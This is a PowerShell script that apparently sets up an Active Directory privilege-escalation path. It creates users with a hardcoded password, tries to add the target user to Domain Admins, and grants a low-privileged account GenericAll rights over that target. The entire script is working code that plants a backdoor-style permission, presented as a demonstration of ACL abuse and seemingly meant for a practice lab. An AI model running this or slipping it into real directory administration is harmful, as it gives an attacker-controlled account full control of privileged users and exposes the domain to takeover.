<#
.SYNOPSIS
Abuses weak ACL permissions to grant a low-privileged user GenericAll rights over a target AD account.
If the users do not exist, the script will create them automatically.

.DESCRIPTION
This script demonstrates ACL/DACL abuse in Active Directory by:
1. Ensuring both the low-privileged user and target user exist (creates them if not).
2. Adding a GenericAll permission for the low-privileged user over the target user.
3. Validating whether the permission was successfully applied.

.REQUIREMENTS
- Permissions to read and write ACLs on the target object (or write access to that object).
- Domain-joined machine.
- ActiveDirectory module (RSAT tools installed).

.PARAMETER TargetUser
The SamAccountName of the target user (e.g., "domainadmin").

.PARAMETER LowPrivUser
The SamAccountName of the low-privileged user to which GenericAll rights will be granted.

.EXAMPLE
PS> .\weak_acl.ps1 -TargetUser "domainadmin" -LowPrivUser "low.priv"
Grants "low.priv" GenericAll permissions over "domainadmin".
#>

param(
	[Parameter(Mandatory=$true)][string]$TargetUser,
	[Parameter(Mandatory=$true)][string]$LowPrivUser
)

# --- Check AD module ---
if (-not (Get-Module -ListAvailable -Name ActiveDirectory))
{
	Write-Error "ActiveDirectory module not found. Install RSAT tools."
	exit 1
}
Import-Module ActiveDirectory

function Write-Ok
{ param([string]$m) Write-Host "[+] $m" -ForegroundColor Green 
}
function Write-Bad
{ param([string]$m) Write-Host "[-] $m" -ForegroundColor Red 
}
function Write-Info
{ param([string]$m) Write-Host "[*] $m" -ForegroundColor Cyan 
}

# --- Ensure LowPrivUser exists ---
try
{ $LowPriv = Get-ADUser -Identity $LowPrivUser -ErrorAction Stop 
} catch
{
	Write-Info "Low-privileged user '$LowPrivUser' not found. Creating..."
	$LowPriv = New-ADUser -Name $LowPrivUser -SamAccountName $LowPrivUser `
		-AccountPassword (ConvertTo-SecureString "p@ssw0rd123!" -AsPlainText -Force) -Enabled $true
	Write-Ok "Created low-privileged user: $LowPrivUser"
}

# --- Ensure TargetUser exists ---
try
{ $Target = Get-ADUser -Identity $TargetUser -ErrorAction Stop 
} catch
{
	Write-Info "Target user '$TargetUser' not found. Creating..."
	$Target = New-ADUser -Name $TargetUser -SamAccountName $TargetUser `
		-AccountPassword (ConvertTo-SecureString "p@ssw0rd123!" -AsPlainText -Force) -Enabled $true
	# Add to Domain Admins if possible
	try
	{
		Add-ADGroupMember -Identity "Domain Admins" -Members $Target.SamAccountName
		Write-Ok "Added $TargetUser to Domain Admins"
	} catch
	{
		Write-Info "Could not add $TargetUser to Domain Admins. Created as regular user."
	}
}

# --- Refresh objects ---
$Target = Get-ADUser -Identity $TargetUser
$LowPriv = Get-ADUser -Identity $LowPrivUser

# --- Apply GenericAll ACL ---
$TargetDN = "LDAP://" + $Target.DistinguishedName
$TargetDE = [ADSI]$TargetDN

$LowPrivSID = (New-Object System.Security.Principal.NTAccount($LowPriv.SamAccountName)).Translate([System.Security.Principal.SecurityIdentifier])
$ACL = $TargetDE.ObjectSecurity

$Rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
	$LowPrivSID,
	[System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
	[System.Security.AccessControl.AccessControlType]::Allow
)

$ACL.AddAccessRule($Rule)
$TargetDE.ObjectSecurity = $ACL
$TargetDE.CommitChanges()

# --- Refresh ACL for validation ---
$TargetDE = [ADSI]$TargetDN
$ACL = $TargetDE.ObjectSecurity

# --- Validate GenericAll ---
$appliedRule = $ACL.Access | Where-Object {
	($_.IdentityReference -match $LowPriv.SamAccountName -or $_.IdentityReference -match ".*\\$($LowPriv.SamAccountName)") `
		-and $_.ActiveDirectoryRights -match "GenericAll"
}

if ($appliedRule)
{ Write-Ok "Successfully granted GenericAll rights to $($LowPriv.SamAccountName) over $($Target.SamAccountName)"; exit 0 
} else
{ Write-Bad "Failed to apply GenericAll rights to $($LowPriv.SamAccountName)"; exit 1 
}
